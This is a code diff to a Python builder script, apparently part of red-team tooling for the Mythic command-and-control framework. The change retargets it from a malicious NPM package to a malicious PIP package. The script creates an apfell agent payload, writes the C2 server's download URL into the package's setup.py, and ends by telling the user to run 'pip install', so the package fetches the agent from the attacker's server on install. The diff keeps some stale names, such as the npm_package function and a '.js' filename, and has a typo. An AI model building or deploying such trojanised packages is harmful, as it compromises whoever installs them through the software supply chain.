@@ -5,8 +5,8 @@ import subprocess
 from Settings.MythicSettings import *
 
 def npm_package():
-    temp = "./Templates/NodeJS_NPM_Package/"
-    payload = "./Payloads/NodeJS_NPM_Package_Payload/"
+    temp = "./Templates/Python_PIP_Package/"
+    payload = "./Payloads/Python_PIP_Package_Payload/"
 
     def copyanything(src, dst):
         try:
@@ -42,11 +42,11 @@ def npm_package():
                     ]
                 },
             # give our payload a description if we want
-            tag="NodeJS NPM Package",
+            tag="Python PIP Package",
             selected_os="macOS",
             # if we want to only include specific commands, put them here:
             #commands=["cmd1", "cmd2", "cmd3"],
-            filename="NodeJS_NPM_Package.js")
+            filename="Python_PIP_Package.js")
         print("[+] Creating new apfell payload")
         # create the payload and include all commands
         # if we define commands in the payload definition, then remove the all_commands=True piece
@@ -55,7 +55,7 @@ def npm_package():
 
         # Replace template values
         templateString = "URL"
-        modifyFile = payload + "lib.js"
+        modifyFile = payload + "setup.py"
         url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid # modify to point to desired location
 
         fin = open(modifyFile, "rt")
@@ -68,9 +68,9 @@ def npm_package():
         fin.close()
 
         #  Build the payload (currently no payload)
-        print("[*] Building NodeJS NPM Package")
+        print("[*] Building Python PIP Package")
         os.system("chmod +x " + modifyFile)
-        print("[*] Done! Execute using NodeJS 'npm install'.")
+        print("[*] Done! Execute using Pythoon 'pip install'.")
 
     async def main():
         await scripting()
